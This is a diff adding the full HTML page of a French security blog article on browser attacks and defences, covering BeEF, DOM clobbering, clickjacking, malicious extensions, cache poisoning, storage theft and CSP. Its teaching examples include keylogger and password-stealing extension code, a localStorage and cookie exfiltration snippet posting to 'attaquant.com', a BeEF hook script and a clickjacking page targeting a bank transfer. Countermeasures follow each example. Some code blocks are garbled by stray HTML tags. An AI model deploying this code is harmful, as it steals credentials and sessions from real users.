@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Attaques sur les navigateurs web : exploitation et défense — Temgus.CyberBlog</title>
 <meta name="description" content="BeEF framework, DOM Clobbering, Clickjacking, extensions malveillantes, Cache Poisoning et Content Security Policy.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/attaques-navigateurs.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/attaques-navigateurs.html">
 <meta property="og:title" content="Attaques sur les navigateurs web : exploitation et défense — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Attaques sur les navigateurs web : exploitation et défense — Temgus.CyberBlog">
 <meta name="twitter:description" content="BeEF framework, DOM Clobbering, Clickjacking, extensions malveillantes, Cache Poisoning et Content Security Policy.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,584 @@
   "headline": "Attaques sur les navigateurs web : exploitation et défense",
   "description": "BeEF framework, DOM Clobbering, Clickjacking, extensions malveillantes, Cache Poisoning et Content Security Policy.",
   "datePublished": "2025-09-10",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/attaques-navigateurs.html",
   "inLanguage": "fr",
   "keywords": "navigateur, BeEF, XSS, clickjacking, CSP",
-  "timeRequired": "PT11M"
+  "timeRequired": "PT11M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🌐</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Attaques sur les navigateurs web : exploitation et défense</h1>
-  <p style="color:#8892a4;max-width:500px">BeEF framework, DOM Clobbering, Clickjacking, extensions malveillantes, Cache Poisoning et Content Security Policy.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#attaques-navigateurs" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🌐</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Attaques sur les navigateurs web : exploitation et défense</div>
+      <div class="meta-details">
+        <span>📅 2025-09-10</span>
+        <span>⏱ 11 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#le-navigateur-comme-vecteur-d-attaque">Le navigateur comme vecteur d'attaque</a></li>
+<li><a href="#beef-browser-exploitation-framework">BeEF — Browser Exploitation Framework</a></li>
+<li><a href="#attaques-dom-avanc-es">Attaques DOM avancées</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#dom-clobbering">DOM Clobbering</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#clickjacking">Clickjacking</a></li>
+<li><a href="#extensions-de-navigateur-malveillantes">Extensions de navigateur malveillantes</a></li>
+<li><a href="#cache-poisoning-et-browser-cache-attacks">Cache Poisoning et Browser Cache Attacks</a></li>
+<li><a href="#attaques-sur-le-stockage-navigateur">Attaques sur le stockage navigateur</a></li>
+<li><a href="#content-security-policy-csp-la-d-fense-principale">Content Security Policy (CSP) — La défense principale</a></li>
+<li><a href="#fingerprinting-navigateur-et-vie-priv-e">Fingerprinting navigateur et vie privée</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Attaques sur les navigateurs web : exploitation et défense</h1>
+
+<p>Les navigateurs web sont la porte d'entrée principale vers Internet et l'une des surfaces d'attaque les plus exploitées. Extensions malveillantes, attaques DOM, BeEF framework — ce guide couvre les techniques d'exploitation des navigateurs et les contre-mesures.</p>
+
+<h2 id="le-navigateur-comme-vecteur-d-attaque">Le navigateur comme vecteur d'attaque</h2>
+
+<pre><code>Pourquoi les navigateurs sont ciblés :
+<p>→ Installés sur 100% des machines</p>
+<p>→ Exécutent du code non fiable (JavaScript)</p>
+<p>→ Stockent des credentials, cookies, historique</p>
+<p>→ Accès aux microphones, caméras, géolocalisation</p>
+<p>→ Point d'entrée pour les attaques drive-by download</p>
+
+<p>Statistiques :</p>
+<p>→ 60% des attaques initiales passent par le navigateur</p>
+<p>→ Phishing via email → lien → navigateur = vecteur #1</p>
+<p>→ Les CVE navigateurs : des centaines par an</code></pre>
+
+<h2 id="beef-browser-exploitation-framework">BeEF — Browser Exploitation Framework</h2>
+
+<pre><code class="language-javascript">// BeEF (Browser Exploitation Framework) est un outil de pentest
+<p>// qui permet de contrôler des navigateurs victimes via XSS</p>
+
+<p>// Installation</p>
+<p>git clone https://github.com/beefproject/beef</p>
+<p>cd beef &amp;&amp; ./install</p>
+<p>./beef -x  // Démarrer BeEF</p>
+
+<p>// Une fois un navigateur hooké via XSS :</p>
+<p>// &lt;script src="http://attaquant.com:3000/hook.js"&gt;&lt;/script&gt;</p>
+
+<p>// Depuis l'interface BeEF, on peut :</p>
+<p>// → Récupérer l'historique de navigation</p>
+<p>// → Prendre une capture d'écran de ce que voit la victime</p>
+<p>// → Détecter les plugins installés</p>
+<p>// → Rediriger vers une page de phishing</p>
+<p>// → Lancer des scans réseau depuis le navigateur victime</p>
+<p>// → Keylogging via JavaScript</p>
+<p>// → Voler les cookies (si pas HttpOnly)</p>
+<p>// → Social engineering (fausses alertes, faux login)</p>
+
+<p>// Commandes BeEF via API REST</p>
+<p>const beef_api = "http://localhost:3000/api";</p>
+
+<p>// Lister les browsers hookés</p>
+<p>fetch(<code>${beef_api}/hooks</code>, {</p>
+<p>headers: {"X-Auth-Token": "BEEF_API_KEY"}</p>
+<p>}).then(r =&gt; r.json()).then(console.log);</p>
+
+<p>// Exécuter une commande sur un browser</p>
+<p>fetch(<code>${beef_api}/modules</code>, {</p>
+<p>method: "POST",</p>
+<p>headers: {</p>
+<p>"X-Auth-Token": "BEEF_API_KEY",</p>
+<p>"Content-Type": "application/json"</p>
+<p>},</p>
+<p>body: JSON.stringify({</p>
+<p>"beefhook": "HOOK_ID",</p>
+<p>"command_module_id": 6  // 6 = Get Cookie</p>
+<p>})</p>
+<p>});</code></pre>
+
+<h2 id="attaques-dom-avanc-es">Attaques DOM avancées</h2>
+
+<h3 id="dom-clobbering">DOM Clobbering</h3>
+
+<pre><code class="language-html">&lt;!-- DOM Clobbering : écraser des variables JS avec des éléments HTML --&gt;
+
+<p>&lt;!-- Code JavaScript vulnérable --&gt;</p>
+<p>&lt;script&gt;</p>
+<p>if (window.config &amp;&amp; window.config.isAdmin) {</p>
+<p>showAdminPanel();</p>
+<p>}</p>
+<p>&lt;/script&gt;</p>
+
+<p>&lt;!-- Injection HTML qui "clobbers" la variable config --&gt;</p>
+<p>&lt;form id="config"&gt;</p>
+<p>&lt;input id="isAdmin" value="true"&gt;</p>
+<p>&lt;/form&gt;</p>
+
+<p>&lt;!-- window.config = formulaire HTML</p>
+<p>window.config.isAdmin = input HTML (truthy !)</p>
+<p>→ showAdminPanel() est appelé ! --&gt;</p>
+
+<p>&lt;!-- Protection :</p>
+<p>Ne jamais utiliser window.x pour stocker des configs</p>
+<p>Utiliser des namespaces sécurisés</p>
+<p>Content Security Policy stricte --&gt;</code></pre>
+
+<h3 id="clickjacking">Clickjacking</h3>
+
+<pre><code class="language-html">&lt;!-- Clickjacking : superposer une iframe invisible sur un bouton légitime --&gt;
+
+<p>&lt;style&gt;</p>
+<p>iframe {</p>
+<p>position: absolute;</p>
+<p>top: 0;</p>
+<p>left: 0;</p>
+<p>width: 100%;</p>
+<p>height: 100%;</p>
+<p>opacity: 0.0001;  /<em> Invisible mais cliquable ! </em>/</p>
+<p>z-index: 9999;</p>
+<p>}</p>
+<p>.fake-button {</p>
+<p>position: absolute;</p>
+<p>top: 200px;</p>
+<p>left: 300px;</p>
+<p>}</p>
+<p>&lt;/style&gt;</p>
+
+<p>&lt;div class="fake-button"&gt;</p>
+<p>&lt;button&gt;Cliquez ici pour gagner un iPhone ! 🎁&lt;/button&gt;</p>
+<p>&lt;/div&gt;</p>
+
+<p>&lt;!-- iframe pointant vers un vrai site --&gt;</p>
+<p>&lt;iframe src="https://banking.example.com/transfer?amount=1000&amp;to=attaquant"&gt;</p>
+<p>&lt;/iframe&gt;</p>
+
+<p>&lt;!-- La victime croit cliquer sur le bouton cadeau</p>
+<p>mais clique en réalité sur "Confirmer le virement" ! --&gt;</p>
+
+<p>&lt;!-- Protection :</p>
+<p>X-Frame-Options: DENY</p>
+<p>Content-Security-Policy: frame-ancestors 'none' --&gt;</code></pre>
+
+<h2 id="extensions-de-navigateur-malveillantes">Extensions de navigateur malveillantes</h2>
+
+<pre><code class="language-python"># Anatomie d'une extension malveillante
+
+<h1>manifest.json - Déclare les permissions demandées</h1>
+<p>manifest = {</p>
+<p>"name": "Ad Blocker Pro",  # Nom innocent</p>
+<p>"version": "1.0",</p>
+<p>"manifest_version": 3,</p>
+<p>"permissions": [</p>
+<p>"tabs",            # Voir tous les onglets ouverts</p>
+<p>"webRequest",      # Intercepter TOUTES les requêtes</p>
+<p>"storage",         # Stocker des données</p>
+<p>"cookies",         # Accès aux cookies !</p>
+<p>"&lt;all_urls&gt;"       # Sur TOUS les sites</p>
+<p>],</p>
+<p>"background": {</p>
+<p>"service_worker": "background.js"</p>
+<p>},</p>
+<p>"content_scripts": [{</p>
+<p>"matches": ["&lt;all_urls&gt;"],</p>
+<p>"js": ["content.js"]</p>
+<p>}]</p>
+<p>}</p>
+
+<h1>content.js - S'exécute sur chaque page visitée</h1>
+<p>malicious_content = """</p>
+<p>// Keylogger dans l'extension</p>
+<p>document.addEventListener('keypress', function(e) {</p>
+<p>fetch('https://attaquant.com/log', {</p>
+<p>method: 'POST',</p>
+<p>body: JSON.stringify({</p>
+<p>key: e.key,</p>
+<p>url: window.location.href,</p>
+<p>timestamp: Date.now()</p>
+<p>})</p>
+<p>});</p>
+<p>});</p>
+
+<p>// Vol de credentials</p>
+<p>document.querySelectorAll('input[type=password]').forEach(input =&gt; {</p>
+<p>input.addEventListener('change', function() {</p>
+<p>fetch('https://attaquant.com/creds', {</p>
+<p>method: 'POST',</p>
+<p>body: JSON.stringify({</p>
+<p>password: this.value,</p>
+<p>url: window.location.href</p>
+<p>})</p>
+<p>});</p>
+<p>});</p>
+<p>});</p>
+<p>"""</p>
+
+<h1>Détection d'extensions malveillantes :</h1>
+<h1>→ Vérifier les permissions demandées (trop larges = suspect)</h1>
+<h1>→ Analyser le code source (extensions sont des ZIP)</h1>
+<h1>→ CRXcavator.io pour analyser les extensions Chrome</h1>
+<h1>→ Extension Privacy Badger pour surveiller le tracking</code></pre></h1>
+
+<h2 id="cache-poisoning-et-browser-cache-attacks">Cache Poisoning et Browser Cache Attacks</h2>
+
+<pre><code class="language-http"># Web Cache Poisoning via headers non cachés
+
+<p>GET /home HTTP/1.1</p>
+<p>Host: target.com</p>
+<p>X-Forwarded-Host: evil.com</p>
+
+<h1>Si le serveur utilise X-Forwarded-Host pour générer des URLs</h1>
+<h1>et que la réponse est mise en cache...</h1>
+
+<h1>Réponse cachée contenant :</h1>
+<h1>&lt;script src="https://evil.com/analytics.js"&gt;&lt;/script&gt;</h1>
+<h1>Servi à TOUS les visiteurs suivants !</h1>
+
+<h1>Contre-mesures :</h1>
+<h1>→ Ne jamais faire confiance aux headers non standard</h1>
+<h1>→ Cache-Control: no-store pour les pages sensibles</h1>
+<h1>→ Vary header pour différencier les caches par header</code></pre></h1>
+
+<h2 id="attaques-sur-le-stockage-navigateur">Attaques sur le stockage navigateur</h2>
+
+<pre><code class="language-javascript">// Vol de données depuis localStorage/sessionStorage via XSS
+
+<p>// Exfiltrer tout le localStorage</p>
+<p>const allData = {};</p>
+<p>for (let i = 0; i &lt; localStorage.length; i++) {</p>
+<p>const key = localStorage.key(i);</p>
+<p>allData[key] = localStorage.getItem(key);</p>
+<p>}</p>
+
+<p>// Envoyer vers le serveur attaquant</p>
+<p>fetch('https://attaquant.com/steal', {</p>
+<p>method: 'POST',</p>
+<p>body: JSON.stringify({</p>
+<p>localStorage: allData,</p>
+<p>cookies: document.cookie,</p>
+<p>sessionStorage: JSON.stringify(sessionStorage),</p>
+<p>url: window.location.href</p>
+<p>})</p>
+<p>});</p>
+
+<p>// Protection :</p>
+<p>// → Ne jamais stocker de données sensibles en localStorage</p>
+<p>// → Tokens d'auth : utiliser des cookies HttpOnly + Secure</p>
+<p>// → CSP pour limiter les domaines vers lesquels JS peut envoyer des données</code></pre>
+
+<h2 id="content-security-policy-csp-la-d-fense-principale">Content Security Policy (CSP) — La défense principale</h2>
+
+<pre><code class="language-http"># CSP stricte contre la plupart des attaques navigateur
+
+<p>Content-Security-Policy:</p>
+<p>default-src 'self';</p>
+<p>script-src 'self' 'nonce-RANDOM123' https://cdn.trusted.com;</p>
+<p>style-src 'self' 'nonce-RANDOM123';</p>
+<p>img-src 'self' data: https:;</p>
+<p>connect-src 'self' https://api.monsite.com;</p>
+<p>frame-ancestors 'none';</p>
+<p>base-uri 'self';</p>
+<p>form-action 'self';</p>
+<p>upgrade-insecure-requests;</p>
+
+<h1>Explication :</h1>
+<h1>default-src 'self'          → Tout depuis le même domaine par défaut</h1>
+<h1>script-src 'nonce-...'      → Seuls les scripts avec ce nonce s'exécutent</h1>
+<h1>frame-ancestors 'none'      → Bloque le clickjacking</h1>
+<h1>base-uri 'self'             → Empêche base tag hijacking</h1>
+<h1>upgrade-insecure-requests   → Force HTTPS</h1>
+
+<h1>Tester votre CSP :</h1>
+<h1>https://csp-evaluator.withgoogle.com/</code></pre></h1>
+
+<h2 id="fingerprinting-navigateur-et-vie-priv-e">Fingerprinting navigateur et vie privée</h2>
+
+<pre><code class="language-javascript">// Les sites peuvent identifier votre navigateur sans cookies
+<p>// via le Browser Fingerprinting</p>
+
+<p>async function getFingerprint() {</p>
+<p>const fingerprint = {</p>
+<p>// Résolution écran</p>
+<p>screen: <code>${screen.width}x${screen.height}x${screen.colorDepth}</code>,</p>
+
+<p>// Timezone</p>
+<p>timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,</p>
+
+<p>// Plugins installés</p>
+<p>plugins: Array.from(navigator.plugins).map(p =&gt; p.name).join(','),</p>
+
+<p>// Fonts disponibles (via Canvas)</p>
+<p>canvas: getCanvasHash(),</p>
+
+<p>// WebGL renderer (unique par GPU + driver)</p>
+<p>webgl: getWebGLRenderer(),</p>
+
+<p>// Support de fonctionnalités</p>
+<p>features: {</p>
+<p>doNotTrack: navigator.doNotTrack,</p>
+<p>touchPoints: navigator.maxTouchPoints,</p>
+<p>hardwareConcurrency: navigator.hardwareConcurrency,</p>
+<p>deviceMemory: navigator.deviceMemory</p>
+<p>}</p>
+<p>};</p>
+
+<p>return fingerprint;</p>
+<p>}</p>
+
+<p>// Protection contre le fingerprinting :</p>
+<p>// → Brave Browser : randomise les valeurs canvas/WebGL</p>
+<p>// → Firefox avec privacy.resistFingerprinting = true</p>
+<p>// → Tor Browser : harmonise toutes les valeurs pour les rendre identiques</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Les navigateurs sont des vecteurs d'attaque complexes et omniprésents. La défense en profondeur combine : <strong>CSP stricte</strong> pour bloquer l'exécution de code non autorisé, <strong>X-Frame-Options</strong> contre le clickjacking, <strong>cookies HttpOnly+Secure</strong> contre le vol de session, et une <strong>politique stricte sur les extensions</strong> installées. Pour les pentesters, BeEF reste l'outil de référence pour démontrer l'impact réel d'une XSS.</p>
+
+<p>---</p>
+<p><em>Catégorie : Pentest</em></p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#attaques-navigateurs" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-conteneurs-docker-avance.html" class="nav-prev">← Sécurité avancée des conteneurs : escapes et hardening</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/malware-c2-frameworks.html" class="nav-next">Frameworks C2 : comprendre les infrastructures de commande et contrôle →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
